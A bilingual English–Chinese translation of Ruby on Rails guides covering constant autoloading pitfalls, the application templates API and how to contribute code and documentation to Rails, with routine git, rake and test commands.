# app/models/hotel/image.rb
class Hotel
  class Image < Image
  end
end

the expression Hotel::Image is ambiguous, depends on the execution path.
表达式Hotel::Image是不确定的，取决于执行路径。

As we saw before, Ruby looks up the constant in Hotel and its ancestors. If app/models/image.rb has been loaded but app/models/hotel/image.rb hasn't, Ruby does not find Image in Hotel, but it does in Object:
正如前面的《合格常量的解析运算》一节所见，Ruby在Hotel里查找常量和它的超类。如果app/models/image.rb已经被加载，但app/models/hotel/image.rb还没有，Ruby不能在Hotel里找到Image，但在Object里找到了。

$ bin/rails r 'Image; p Hotel::Image' 2>/dev/null
Image # NOT Hotel::Image!

The code evaluating Hotel::Image needs to make sure app/models/hotel/image.rb has been loaded, possibly with require_dependency.
评估Hotel::Image的代码需要确保app/models/hotel/image.rb文件已被加载，需要使用请求依赖。

In these cases the interpreter issues a warning though:
不过在这些例子中，解释器发出一个警告：
warning: toplevel constant Image referenced by Hotel::Image

This surprising constant resolution can be observed with any qualifying class:
这个令人吃惊的常量解析可以被任何合格类观察到。
####  2.1.5 :001 > String::Array
(irb):1: warning: toplevel constant Array referenced by String::Array
 => Array

To find this gotcha the qualifying namespace has to be a class, Object is not an ancestor of modules.
要找到这个收场，合格命名空间必须是个类，Object不是模块的超类。
###  10.7 Autoloading within Singleton Classes 在单例类里自动加载

Let's suppose we have these class definitions:
假设我们有下面这些类定义：
# app/models/hotel/services.rb
module Hotel
  class Services
  end
end
 
# app/models/hotel/geo_location.rb
module Hotel
  class GeoLocation
    class << self
      Services
    end
  end
end

If Hotel::Services is known by the time app/models/hotel/geo_location.rb is being loaded, Services is resolved by Ruby because Hotel belongs to the nesting when the singleton class of Hotel::GeoLocation is opened.
如果Hotel::Services在app/models/hotel/geo_location.rb已加载时为已知，因为当Hotel::GeoLocation的单列类被打开时Hotel属于嵌套，Services会被Ruby解析。

But if Hotel::Services is not known, Rails is not able to autoload it, the application raises NameError.
但如果Hotel::Services为未知，Rails就不能自动加载它，程序将抛出NameError异常。

The reason is that autoloading is triggered for the singleton class, which is anonymous, and as we saw before, Rails only checks the top-level namespace in that edge case.
理由是，为了匿名的单例类，自动加载被触发了。正如在前面《一般流程》里所见，Rails只会在那种极端情况下检出顶级命名空间。

An easy solution to this caveat is to qualify the constant:
这种问题的建议解决方案是认证常量：
module Hotel
  class GeoLocation
    class << self
      Hotel::Services
    end
  end
end
###  10.8 Autoloading in BasicObject 在基本对象里自动加载

Direct descendants of BasicObject do not have Object among their ancestors and cannot resolve top-level constants:
基本对象的直接后代，其超类中没有Object，所以不能解析顶级常量。
class C < BasicObject
  String # NameError: uninitialized constant C::String
end

When autoloading is involved that plot has a twist. Let's consider:
在该处放入自动加载会出现麻烦。想想下面：
class C < BasicObject
  def user
    User # WRONG
  end
end

Since Rails checks the top-level namespace User gets autoloaded just fine the first time the user method is invoked. You only get the exception if the User constant is known at that point, in particular in a second call to user:
因为user方法被调用的第一时间，Rails检查到顶级命名空间User刚好得到自动加载。如果在那个点上User常量为已知，就会抛出异常了，特别是在第二次调用user的时候：
c = C.new
c.user # surprisingly fine, User
c.user # NameError: uninitialized constant C::User

because it detects a parent namespace already has the constant (see Qualified References.)
因为它侦测到一个父类命名空间已经有了常量（参见上面的限定引用）。

As with pure Ruby, within the body of a direct descendant of BasicObject use always absolute constant paths:
和纯Ruby一样，在基本对象的直接后代的主体里使用，总是使用绝对常量路径：
class C < BasicObject
  ::String # RIGHT
 
  def user
    ::User # RIGHT
  end
end

## 反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Rails Application Templates  Rails程序模板

Application templates are simple Ruby files containing DSL for adding gems/initializers etc. to your freshly created Rails project or an existing Rails project.
程序模板是包含了添加软件包/启动其等到刚创建的Rails项目或已存Rails项目的DSL的简单Ruby文件。

After reading this guide, you will know:
读完本指南，你将知道：

    How to use templates to generate/customize Rails applications.
    怎么使用模板来创建或自定义Rails程序。
    How to write your own reusable application templates using the Rails template API.
    怎么使用Rails模板API写自己的可重用程序模板

Chapters 目录

    Usage 用法
    Template API  模板API
        gem(*args)
        gem_group(*names, &block)
        add_source(source, options = {})
        environment/application(data=nil, options={}, &block)
        vendor/lib/file/initializer(filename, data = nil, &block)
        rakefile(filename, data = nil, &block)
        generate(what, *args)
        run(command)
        rake(command, options = {})
        route(routing_code)
        inside(dir)
        ask(question)
        yes?(question) or no?(question)
        git(:command)
    Advanced Usage 高级用法

##  1 Usage  用法

To apply a template, you need to provide the Rails generator with the location of the template you wish to apply using the -m option. This can either be a path to a file or a URL.
为了应用一个模板，需要提供Rails生成器，并用-m选项指定要应用的模板的位置。可以是路径，也可以是URL。
$ rails new blog -m ~/template.rb
$ rails new blog -m http://example.com/template.rb

You can use the rake task rails:template to apply templates to an existing Rails application. The location of the template needs to be passed in to an environment variable named LOCATION. Again, this can either be path to a file or a URL.
可以使用rake task rails:template来将模板应用到已存的Rails程序中。模板的位置需要传入LOCATION环境变量中。同样可以是路径或URL。
$ bin/rake rails:template LOCATION=~/template.rb
$ bin/rake rails:template LOCATION=http://example.com/template.rb
##  2 Template API  模板API

The Rails templates API is easy to understand. Here's an example of a typical Rails template:
很容易理解Rails模板API。下面是普通Rails模板的例子：
# template.rb
generate(:scaffold, "person name:string")
route "root to: 'people#index'"
rake("db:migrate")
 
git :init
git add: "."
git commit: %Q{ -m 'Initial commit' }

The following sections outline the primary methods provided by the API:
下面的小节勾画出API提供的主要方法：
###  2.1 gem(*args)

Adds a gem entry for the supplied gem to the generated application's Gemfile.
为指定软件包在已生成的程序的Gemfile里增加一个软件包条目。

For example, if your application depends on the gems bj and nokogiri:
比如，如果程序依赖bj和nokogiri软件包：
gem "bj"
gem "nokogiri"

Please note that this will NOT install the gems for you and you will have to run bundle install to do that.
请注意这不是安装软件包，你必须运行`bundle install`来安装。
bundle install
###  2.2 gem_group(*names, &block)

Wraps gem entries inside a group.
将软件包条目包装在一个组里。

For example, if you want to load rspec-rails only in the development and test groups:
比如，如果只想在开发环境和测试环境中加载rspec-rails
gem_group :development, :test do
  gem "rspec-rails"
end
###  2.3 add_source(source, options = {})

Adds the given source to the generated application's Gemfile.
将指定源添加到已生成的程序Gemfile中。

For example, if you need to source a gem from "http://code.whytheluckystiff.net":
比如，如果需要添加"http://code.whytheluckystiff.net"作为一个软件包的源：
add_source "http://code.whytheluckystiff.net"
###  2.4 environment/application(data=nil, options={}, &block)

Adds a line inside the Application class for config/application.rb.
在Application类添加一行配置。

If options[:env] is specified, the line is appended to the corresponding file in config/environments.
如果指定了[:env]选项，该行将被追加到config/environments目录中对应的文件内。
environment 'config.action_mailer.default_url_options = {host: "http://yourwebsite.example.com"}', env: 'production'

A block can be used in place of the data argument.
代码块可取代data参数的作用。
###  2.5 vendor/lib/file/initializer(filename, data = nil, &block)

Adds an initializer to the generated application's config/initializers directory.
将一个启动器添加到已生成程序的config/initializers目录。

Let's say you like using Object#not_nil? and Object#not_blank?:
比如如果喜欢使用Object#not_nil?和Object#not_blank?方法：
initializer 'bloatlol.rb', <<-CODE
  class Object
    def not_nil?
      !nil?
    end
 
    def not_blank?
      !blank?
    end
  end
CODE

Similarly, lib() creates a file in the lib/ directory and vendor() creates a file in the vendor/ directory.
类似的，lib()在lib/目录创建一个文件，vendor在vendor目录创建一个文件。

There is even file(), which accepts a relative path from Rails.root and creates all the directories/files needed:
甚至file()，它接受一个Rails.root相对路径，创建所有需要的目录和文件。
file 'app/components/foo.rb', <<-CODE
  class Foo
  end
CODE

That'll create the app/components directory and put foo.rb in there.
会创建一个app/components/目录，并在里面创建一个foo.rb文件。
###  2.6 rakefile(filename, data = nil, &block)

Creates a new rake file under lib/tasks with the supplied tasks:
用提供的任务在lib/tasks目录下创建一个新的任务文件。
rakefile("bootstrap.rake") do
  <<-TASK
    namespace :boot do
      task :strap do
        puts "i like boots!"
      end
    end
  TASK
end

The above creates lib/tasks/bootstrap.rake with a boot:strap rake task.
上面的代码用一个boot:strap的rake任务创建一个lib/tasks/bootstrap.rake文件
###  2.7 generate(what, *args)

Runs the supplied rails generator with given arguments.
用指定参数运行提供的rails生成器。
generate(:scaffold, "person", "name:string", "address:text", "age:number")
###  2.8 run(command)

Executes an arbitrary command. Just like the backticks. Let's say you want to remove the README.rdoc file:
执行任意一个命令。就像一个`（反撇号）。比如想移除README.rdoc文件：
run "rm README.rdoc"
###  2.9 rake(command, options = {})

Runs the supplied rake tasks in the Rails application. Let's say you want to migrate the database:
在Rails程序里运行提供的rake任务。比如想迁移数据：
rake "db:migrate"

You can also run rake tasks with a different Rails environment:
也可以用不同的Rails环境来运行rake任务。
rake "db:migrate", env: 'production'
2.10 route(routing_code)

Adds a routing entry to the config/routes.rb file. In the steps above, we generated a person scaffold and also removed README.rdoc. Now, to make PeopleController#index the default page for the application:
在config/routes.rb文件中添加一个路由条目了。前面创建了一个person支架，也移除了README.rdoc。现在为程序的PeopleController#index路由到默认页面。
route "root to: 'person#index'"
2.11 inside(dir)

Enables you to run a command from the given directory. For example, if you have a copy of edge rails that you wish to symlink from your new apps, you can do this:
允许从给定目录运行一个命令。比如，如果你有一个edge的rails的副本，想从新的程序中符号连接，可以这样做：
inside('vendor') do
  run "ln -s ~/commit-rails/rails rails"
end
2.12 ask(question)

ask() gives you a chance to get some feedback from the user and use it in your templates. Let's say you want your user to name the new shiny library you're adding:
ask()给你有机会从用户得到回馈，可以在模板中使用它。比如想让用户命名新添加的shiny库：
lib_name = ask("What do you want to call the shiny library ?")
lib_name << ".rb" unless lib_name.index(".rb")
 
lib lib_name, <<-CODE
  class Shiny
  end
CODE
2.13 yes?(question) or no?(question)

These methods let you ask questions from templates and decide the flow based on the user's answer. Let's say you want to freeze rails only if the user wants to:
这些方法允许你从模板里询问问题，基于用户的答案作出决定。比如说想在用户希望的时候冻结程序。
rake("rails:freeze:gems") if yes?("Freeze rails gems?")
# no?(question) acts just the opposite.
2.14 git(:command)

Rails templates let you run any git command:
Rails模板可运行任何git命令。
git :init
git add: "."
git commit: "-a -m 'Initial commit'"
##  3 Advanced Usage  高级用法

The application template is evaluated in the context of a Rails::Generators::AppGenerator instance. It uses the apply action provided by Thor. This means you can extend and change the instance to match your needs.
程序模板在Rails::Generators::AppGenerator实例的环境中求值。它使用 Thor 提供的apply动作。这意味着可以根据需要来扩展和改变该实例。

For example by overwriting the source_paths method to contain the location of your template. Now methods like copy_file will accept relative paths to your template's location.
比如通过重写source_paths 方法可包含你的模板的位置。新的方法，比如copy_file，将会接受模板位置的相对路径。
def source_paths
  [File.expand_path(File.dirname(__FILE__))]
end

## 反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Contributing to Ruby on Rails 为Ruby on Rails做贡献

This guide covers ways in which you can become a part of the ongoing development of Ruby on Rails.
这个指南涵盖了你变成Ruby on Rails开发进程一份子的几种方式

After reading this guide, you will know:
读完这个指南，你将会知道：

    How to use GitHub to report issues.
    怎么使用GitHub来报告问题。
    How to clone master and run the test suite.
    怎么克隆主干代码，并运行测试套件。
    How to help resolve existing issues.
    怎么帮助解决现存问题。
    How to contribute to the Ruby on Rails documentation.
    怎么为Ruby on Rails文档贡献力量。
    How to contribute to the Ruby on Rails code.
    怎么为Ruby on Rails代码贡献力量。

Ruby on Rails is not "someone else's framework." Over the years, hundreds of people have contributed to Ruby on Rails ranging from a single character to massive architectural changes or significant documentation - all with the goal of making Ruby on Rails better for everyone. Even if you don't feel up to writing code or documentation yet, there are a variety of other ways that you can contribute, from reporting issues to testing patches.
Ruby on Rails不是别人的框架。这些年来，数以百计的人为Ruby on Rails作出了贡献，从单个字符的更改，到大框架的改变或重要的文档——所有这些都让Ruby on Rails变得更好。甚至可以不用写代码或文档，还有多种方式可以作出贡献的：报告问题、测试补丁……
Chapters 目录

    Reporting an Issue 报告问题
        Creating a Bug Report 创建一个臭虫报告
        Create a Self-Contained gist for Active Record and Action Controller Issues
        Special Treatment for Security Issues
        What about Feature Requests?
    Helping to Resolve Existing Issues
        Verifying Bug Reports
        Testing Patches
    Contributing to the Rails Documentation
    Contributing to the Rails Code
        Setting Up a Development Environment
        Clone the Rails Repository
        Running an Application Against Your Local Branch
        Write Your Code
        Benchmark Your Code
        Running Tests
        Warnings
        Updating the CHANGELOG
        Sanity Check
        Commit Your Changes
        Update Your Branch
        Fork
        Issue a Pull Request
        Get some Feedback
        Iterate as Necessary
        Older Versions of Ruby on Rails
    Rails Contributors

##  1 Reporting an Issue 报告问题

Ruby on Rails uses GitHub Issue Tracking to track issues (primarily bugs and contributions of new code). If you've found a bug in Ruby on Rails, this is the place to start. You'll need to create a (free) GitHub account in order to submit an issue, to comment on them or to create pull requests.

Bugs in the most recent released version of Ruby on Rails are likely to get the most attention. Also, the Rails core team is always interested in feedback from those who can take the time to test edge Rails (the code for the version of Rails that is currently under development). Later in this guide you'll find out how to get edge Rails for testing.
###  1.1 Creating a Bug Report 创建一个臭虫报告

If you've found a problem in Ruby on Rails which is not a security risk, do a search in GitHub under Issues in case it has already been reported. If you do not find any issue addressing it you may proceed to open a new one. (See the next section for reporting security issues.)

Your issue report should contain a title and a clear description of the issue at the bare minimum. You should include as much relevant information as possible and should at least post a code sample that demonstrates the issue. It would be even better if you could include a unit test that shows how the expected behavior is not occurring. Your goal should be to make it easy for yourself - and others - to replicate the bug and figure out a fix.

Then, don't get your hopes up! Unless you have a "Code Red, Mission Critical, the World is Coming to an End" kind of bug, you're creating this issue report in the hope that others with the same problem will be able to collaborate with you on solving it. Do not expect that the issue report will automatically see any activity or that others will jump to fix it. Creating an issue like this is mostly to help yourself start on the path of fixing the problem and for others to confirm it with an "I'm having this problem too" comment.
###  1.2 Create a Self-Contained gist for Active Record and Action Controller Issues 为活性记录和动作控制器创建一个自包含的要点

If you are filing a bug report, please use Active Record template for gems or Action Controller template for gems if the bug is found in a published gem, and Active Record template for master or Action Controller template for master if the bug happens in the master branch.
###  1.3 Special Treatment for Security Issues 安全问题特殊对待

Please do not report security vulnerabilities with public GitHub issue reports. The Rails security policy page details the procedure to follow for security issues.
###  1.4 What about Feature Requests? 关于特性请求

Please don't put "feature request" items into GitHub Issues. If there's a new feature that you want to see added to Ruby on Rails, you'll need to write the code yourself - or convince someone else to partner with you to write the code. Later in this guide you'll find detailed instructions for proposing a patch to Ruby on Rails. If you enter a wish list item in GitHub Issues with no code, you can expect it to be marked "invalid" as soon as it's reviewed.

Sometimes, the line between 'bug' and 'feature' is a hard one to draw. Generally, a feature is anything that adds new behavior, while a bug is anything that fixes already existing behavior that is misbehaving. Sometimes, the core team will have to make a judgement call. That said, the distinction generally just affects which release your patch will get in to; we love feature submissions! They just won't get backported to maintenance branches.

If you'd like feedback on an idea for a feature before doing the work for make a patch, please send an email to the rails-core mailing list. You might get no response, which means that everyone is indifferent. You might find someone who's also interested in building that feature. You might get a "This won't be accepted." But it's the proper place to discuss new ideas. GitHub Issues are not a particularly good venue for the sometimes long and involved discussions new features require.
##  2 Helping to Resolve Existing Issues 帮助解决现有问题

As a next step beyond reporting issues, you can help the core team resolve existing issues. If you check the Everyone's Issues list in GitHub Issues, you'll find lots of issues already requiring attention. What can you do for these? Quite a bit, actually:
###  2.1 Verifying Bug Reports 验证臭虫报告

For starters, it helps just to verify bug reports. Can you reproduce the reported issue on your own computer? If so, you can add a comment to the issue saying that you're seeing the same thing.

If something is very vague, can you help squash it down into something specific? Maybe you can provide additional information to help reproduce a bug, or help by eliminating needless steps that aren't required to demonstrate the problem.

If you find a bug report without a test, it's very useful to contribute a failing test. This is also a great way to get started exploring the source code: looking at the existing test files will teach you how to write more tests. New tests are best contributed in the form of a patch, as explained later on in the "Contributing to the Rails Code" section.

Anything you can do to make bug reports more succinct or easier to reproduce is a help to folks trying to write code to fix those bugs - whether you end up writing the code yourself or not.
###  2.2 Testing Patches 测试补丁

You can also help out by examining pull requests that have been submitted to Ruby on Rails via GitHub. To apply someone's changes you need first to create a dedicated branch:
$ git checkout -b testing_branch

Then you can use their remote branch to update your codebase. For example, let's say the GitHub user JohnSmith has forked and pushed to a topic branch "orange" located at https://github.com/JohnSmith/rails.
$ git remote add JohnSmith git://github.com/JohnSmith/rails.git
$ git pull JohnSmith orange

After applying their branch, test it out! Here are some things to think about:

    Does the change actually work?
    Are you happy with the tests? Can you follow what they're testing? Are there any tests missing?
    Does it have the proper documentation coverage? Should documentation elsewhere be updated?
    Do you like the implementation? Can you think of a nicer or faster way to implement a part of their change?

Once you're happy that the pull request contains a good change, comment on the GitHub issue indicating your approval. Your comment should indicate that you like the change and what you like about it. Something like:

    I like the way you've restructured that code in generate_finder_sql - much nicer. The tests look good too. 

If your comment simply says "+1", then odds are that other reviewers aren't going to take it too seriously. Show that you took the time to review the pull request.
##  3 Contributing to the Rails Documentation 为Rails文档作贡献

Ruby on Rails has two main sets of documentation: the guides, which help you learn about Ruby on Rails, and the API, which serves as a reference.

You can help improve the Rails guides by making them more coherent, consistent or readable, adding missing information, correcting factual errors, fixing typos, or bringing it up to date with the latest edge Rails. To get involved in the translation of Rails guides, please see Translating Rails Guides.

You can either open a pull request to Rails or ask the Rails core team for commit access on docrails if you contribute regularly. Please do not open pull requests in docrails, if you'd like to get feedback on your change, ask for it in Rails instead.

Docrails is merged with master regularly, so you are effectively editing the Ruby on Rails documentation.

If you are unsure of the documentation changes, you can create an issue in the Rails issues tracker on GitHub.

When working with documentation, please take into account the API Documentation Guidelines and the Ruby on Rails Guides Guidelines.

As explained earlier, ordinary code patches should have proper documentation coverage. Docrails is only used for isolated documentation improvements.

To help our CI servers you should add [ci skip] to your documentation commit message to skip build on that commit. Please remember to use it for commits containing only documentation changes.

Docrails has a very strict policy: no code can be touched whatsoever, no matter how trivial or small the change. Only RDoc and guides can be edited via docrails. Also, CHANGELOGs should never be edited in docrails.
##  4 Contributing to the Rails Code 为Rails代码做贡献
###  4.1 Setting Up a Development Environment 设置一个开发环境

To move on from submitting bugs to helping resolve existing issues or contributing your own code to Ruby on Rails, you must be able to run its test suite. In this section of the guide you'll learn how to setup the tests on your own computer.
####  4.1.1 The Easy Way 简单方式

The easiest and recommended way to get a development environment ready to hack is to use the Rails development box.
####  4.1.2 The Hard Way 复杂方式

In case you can't use the Rails development box, see this other guide.
###  4.2 Clone the Rails Repository 克隆Rails仓库

To be able to contribute code, you need to clone the Rails repository:
$ git clone git://github.com/rails/rails.git

and create a dedicated branch:
$ cd rails
$ git checkout -b my_new_branch

It doesn't matter much what name you use, because this branch will only exist on your local computer and your personal repository on GitHub. It won't be part of the Rails Git repository.
###  4.3 Running an Application Against Your Local Branch 为本地分支运行应用

In case you need a dummy Rails app to test changes, the --dev flag of rails new generates an application that uses your local branch:
$ cd rails
$ bundle exec rails new ~/my-test-app --dev

The application generated in ~/my-test-app runs against your local branch and in particular sees any modifications upon server reboot.
###  4.4 Write Your Code 写你的代码

Now get busy and add/edit code. You're on your branch now, so you can write whatever you want (make sure you're on the right branch with git branch -a). But if you're planning to submit your change back for inclusion in Rails, keep a few things in mind:

    Get the code right.
    Use Rails idioms and helpers.
    Include tests that fail without your code, and pass with it.
    Update the (surrounding) documentation, examples elsewhere, and the guides: whatever is affected by your contribution.

Changes that are cosmetic in nature and do not add anything substantial to the stability, functionality, or testability of Rails will generally not be accepted.
####  4.4.1 Follow the Coding Conventions 跟随代码管理

Rails follows a simple set of coding style conventions:

    Two spaces, no tabs (for indentation).
    No trailing whitespace. Blank lines should not have any spaces.
    Indent after private/protected.
    Use Ruby >= 1.9 syntax for hashes. Prefer { a: :b } over { :a => :b }.
    Prefer &&/|| over and/or.
    Prefer class << self over self.method for class methods.
    Use MyClass.my_method(my_arg) not my_method( my_arg ) or my_method my_arg.
    Use a = b and not a=b.
    Use assert_not methods instead of refute.
    Prefer method { do_stuff } instead of method{do_stuff} for single-line blocks.
    Follow the conventions in the source you see used already.

The above are guidelines - please use your best judgment in using them.
###  4.5 Benchmark Your Code 测试你的代码

If your change has an impact on the performance of Rails, please use the benchmark-ips gem to provide benchmark results for comparison.

Here's an example of using benchmark-ips:
require 'benchmark/ips'
 
Benchmark.ips do |x|
  x.report('addition') { 1 + 2 }
  x.report('addition with send') { 1.send(:+, 2) }
end

This will generate a report with the following information:
Calculating -------------------------------------
            addition     69114 i/100ms
  addition with send     64062 i/100ms
-------------------------------------------------
            addition  5307644.4 (±3.5%) i/s -   26539776 in   5.007219s
  addition with send  3702897.9 (±3.5%) i/s -   18513918 in   5.006723s

Please see the benchmark/ips README for more information.
###  4.6 Running Tests 运行测试

It is not customary in Rails to run the full test suite before pushing changes. The railties test suite in particular takes a long time, and even more if the source code is mounted in /vagrant as happens in the recommended workflow with the rails-dev-box.

As a compromise, test what your code obviously affects, and if the change is not in railties, run the whole test suite of the affected component. If all tests are passing, that's enough to propose your contribution. We have Travis CI as a safety net for catching unexpected breakages elsewhere.
####  4.6.1 Entire Rails:    测试整个Rails

To run all the tests, do:
$ cd rails
$ bundle exec rake test
####  4.6.2 For a Particular Component  测试个别组件

You can run tests only for a particular component (e.g. Action Pack). For example, to run Action Mailer tests:
$ cd actionmailer
$ bundle exec rake test
####  4.6.3 Running a Single Test 运行单个测试

You can run a single test through ruby. For instance:
$ cd actionmailer
$ ruby -w -Itest test/mail_layout_test.rb -n test_explicit_class_layout

The -n option allows you to run a single method instead of the whole file.
#####  4.6.3.1 Testing Active Record  测试活性记录

This is how you run the Active Record test suite only for SQLite3:
$ cd activerecord
$ bundle exec rake test:sqlite3

You can now run the tests as you did for sqlite3. The tasks are respectively
test:mysql
test:mysql2
test:postgresql

Finally,
$ bundle exec rake test

will now run the four of them in turn.

You can also run any single test separately:
$ ARCONN=sqlite3 ruby -Itest test/cases/associations/has_many_associations_test.rb

You can invoke test_jdbcmysql, test_jdbcsqlite3 or test_jdbcpostgresql also. See the file activerecord/RUNNING_UNIT_TESTS.rdoc for information on running more targeted database tests, or the file ci/travis.rb for the test suite run by the continuous integration server.
###  4.7 Warnings 警告

The test suite runs with warnings enabled. Ideally, Ruby on Rails should issue no warnings, but there may be a few, as well as some from third-party libraries. Please ignore (or fix!) them, if any, and submit patches that do not issue new warnings.

If you are sure about what you are doing and would like to have a more clear output, there's a way to override the flag:
$ RUBYOPT=-W0 bundle exec rake test
###  4.8 Updating the CHANGELOG 更新日志

The CHANGELOG is an important part of every release. It keeps the list of changes for every Rails version.

You should add an entry to the CHANGELOG of the framework that you modified if you're adding or removing a feature, committing a bug fix or adding deprecation notices. Refactorings and documentation changes generally should not go to the CHANGELOG.

A CHANGELOG entry should summarize what was changed and should end with author's name and it should go on top of a CHANGELOG. You can use multiple lines if you need more space and you can attach code examples indented with 4 spaces. If a change is related to a specific issue, you should attach the issue's number. Here is an example CHANGELOG entry:
*   Summary of a change that briefly describes what was changed. You can use multiple
    lines and wrap them at around 80 characters. Code examples are ok, too, if needed:
 
        class Foo
          def bar
            puts 'baz'
          end
        end
 
    You can continue after the code example and you can attach issue number. GH#1234
 
    *Your Name*

Your name can be added directly after the last word if you don't provide any code examples or don't need multiple paragraphs. Otherwise, it's best to make as a new paragraph.
###  4.9 Sanity Check 正常性检查

You should not be the only person who looks at the code before you submit it. If you know someone else who uses Rails, try asking them if they'll check out your work. If you don't know anyone else using Rails, try hopping into the IRC room or posting about your idea to the rails-core mailing list. Doing this in private before you push a patch out publicly is the "smoke test" for a patch: if you can't convince one other developer of the beauty of your code, you’re unlikely to convince the core team either.
4.10 Commit Your Changes 提交更改

When you're happy with the code on your computer, you need to commit the changes to Git:
$ git commit -a

At this point, your editor should be fired up and you can write a message for this commit. Well formatted and descriptive commit messages are extremely helpful for the others, especially when figuring out why given change was made, so please take the time to write it.

Good commit message should be formatted according to the following example:
Short summary (ideally 50 characters or less)
 
More detailed description, if necessary. It should be wrapped to 72
characters. Try to be as descriptive as you can, even if you think that
the commit content is obvious, it may not be obvious to others. You
should add such description also if it's already present in bug tracker,
it should not be necessary to visit a webpage to check the history.
 
Description can have multiple paragraphs and you can use code examples
inside, just indent it with 4 spaces:
 
    class ArticlesController
      def index
        respond_with Article.limit(10)
      end
    end
 
You can also add bullet points:
 
- you can use dashes or asterisks
 
- also, try to indent next line of a point for readability, if it's too
  long to fit in 72 characters

Please squash your commits into a single commit when appropriate. This simplifies future cherry picks, and also keeps the git log clean.
4.11 Update Your Branch 更新你的分支

It's pretty likely that other changes to master have happened while you were working. Go get them:
$ git checkout master
$ git pull --rebase

Now reapply your patch on top of the latest changes:
$ git checkout my_new_branch
$ git rebase master

No conflicts? Tests still pass? Change still seems reasonable to you? Then move on.
4.12 Fork 分支

Navigate to the Rails GitHub repository and press "Fork" in the upper right hand corner.

Add the new remote to your local repository on your local machine:
$ git remote add mine git@github.com:<your user name>/rails.git

Push to your remote:
$ git push mine my_new_branch

You might have cloned your forked repository into your machine and might want to add the original Rails repository as a remote instead, if that's the case here's what you have to do.

In the directory you cloned your fork:
$ git remote add rails git://github.com/rails/rails.git

Download new commits and branches from the official repository:
$ git fetch rails

Merge the new content:
$ git checkout master
$ git rebase rails/master

Update your fork:
$ git push origin master

If you want to update another branch:
$ git checkout branch_name
$ git rebase rails/branch_name
$ git push origin branch_name
4.13 Issue a Pull Request 发出一个拉出请求

Navigate to the Rails repository you just pushed to (e.g. https://github.com/your-user-name/rails) and click on "Pull Requests" seen in the right panel. On the next page, press "New pull request" in the upper right hand corner.

Click on "Edit", if you need to change the branches being compared (it compares "master" by default) and press "Click to create a pull request for this comparison".

Ensure the changesets you introduced are included. Fill in some details about your potential patch including a meaningful title. When finished, press "Send pull request". The Rails core team will be notified about your submission.
4.14 Get some Feedback 得到回馈

Most pull requests will go through a few iterations before they get merged. Different contributors will sometimes have different opinions, and often patches will need revised before they can get merged.

Some contributors to Rails have email notifications from GitHub turned on, but others do not. Furthermore, (almost) everyone who works on Rails is a volunteer, and so it may take a few days for you to get your first feedback on a pull request. Don't despair! Sometimes it's quick, sometimes it's slow. Such is the open source life.

If it's been over a week, and you haven't heard anything, you might want to try and nudge things along. You can use the rubyonrails-core mailing list for this. You can also leave another comment on the pull request.

While you're waiting for feedback on your pull request, open up a few other pull requests and give someone else some! I'm sure they'll appreciate it in the same way that you appreciate feedback on your patches.
4.15 Iterate as Necessary 必要时迭代

It's entirely possible that the feedback you get will suggest changes. Don't get discouraged: the whole point of contributing to an active open source project is to tap into the knowledge of the community. If people are encouraging you to tweak your code, then it's worth making the tweaks and resubmitting. If the feedback is that your code doesn't belong in the core, you might still think about releasing it as a gem.
4.15.1 Squashing commits 压缩提交

One of the things that we may ask you to do is to "squash your commits", which will combine all of your commits into a single commit. We prefer pull requests that are a single commit. This makes it easier to backport changes to stable branches, squashing makes it easier to revert bad commits, and the git history can be a bit easier to follow. Rails is a large project, and a bunch of extraneous commits can add a lot of noise.

In order to do this, you'll need to have a git remote that points at the main Rails repository. This is useful anyway, but just in case you don't have it set up, make sure that you do this first:
$ git remote add upstream https://github.com/rails/rails.git

You can call this remote whatever you'd like, but if you don't use upstream, then change the name to your own in the instructions below.

Given that your remote branch is called my_pull_request, then you can do the following:
$ git fetch upstream
$ git checkout my_pull_request
$ git rebase upstream/master
$ git rebase -i
 
< Choose 'squash' for all of your commits except the first one. >
< Edit the commit message to make sense, and describe all your changes. >
 
$ git push origin my_pull_request -f

You should be able to refresh the pull request on GitHub and see that it has been updated.
4.16 Older Versions of Ruby on Rails 老版本的RoR

If you want to add a fix to older versions of Ruby on Rails, you'll need to set up and switch to your own local tracking branch. Here is an example to switch to the 4-0-stable branch:
$ git branch --track 4-0-stable origin/4-0-stable
$ git checkout 4-0-stable

You may want to put your Git branch name in your shell prompt to make it easier to remember which version of the code you're working with.
4.16.1 Backporting

Changes that are merged into master are intended for the next major release of Rails. Sometimes, it might be beneficial for your changes to propagate back to the maintenance releases for older stable branches. Generally, security fixes and bug fixes are good candidates for a backport, while new features and patches that introduce a change in behavior will not be accepted. When in doubt, it is best to consult a Rails team member before backporting your changes to avoid wasted effort.

For simple fixes, the easiest way to backport your changes is to extract a diff from your changes in master and apply them to the target branch.

First make sure your changes are the only difference between your current branch and master:
$ git log master..HEAD

Then extract the diff:
$ git format-patch master --stdout > ~/my_changes.patch

Switch over to the target branch and apply your changes:
$ git checkout -b my_backport_branch 3-2-stable
$ git apply ~/my_changes.patch

This works well for simple changes. However, if your changes are complicated or if the code in master has deviated significantly from your target branch, it might require more work on your part. The difficulty of a backport varies greatly from case to case, and sometimes it is simply not worth the effort.

Once you have resolved all conflicts and made sure all the tests are passing, push your changes and open a separate pull request for your backport. It is also worth noting that older branches might have a different set of build targets than master. When possible, it is best to first test your backport locally against the Ruby versions listed in .travis.yml before submitting your pull request.

